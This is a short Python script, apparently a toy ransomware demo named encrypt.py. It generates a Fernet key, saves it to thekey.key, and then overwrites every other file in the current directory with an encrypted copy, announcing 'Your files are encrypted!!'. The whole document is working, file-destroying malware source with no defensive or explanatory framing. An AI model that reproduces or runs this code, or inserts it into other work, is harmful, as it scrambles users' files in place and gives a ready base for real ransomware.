#!/usr/bin/python3

import os
from cryptography.fernet import Fernet

#getting all files in files variable excepting encrypt and decrypt and thekey file if its in same dir

files = []

for file in os.listdir():
	if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	else:
		files.append(file)


print(files)

# here we generate the key and store it in thekey.key file
keyis = Fernet.generate_key()

with open("thekey.key", "wb") as f:
	f.write(keyis)

# here, we are opening every single file in this directry and read it and encrypting it and saving it.


for file in files:
	with open(file, "rb") as rf:
		content = rf.read()
	enc_content = Fernet(keyis).encrypt(content)
	with open(file, "wb") as wf:
		wf.write(enc_content)
		
print("Your files are encrypted!!\nKey to decrypt content is in thekey.key file")
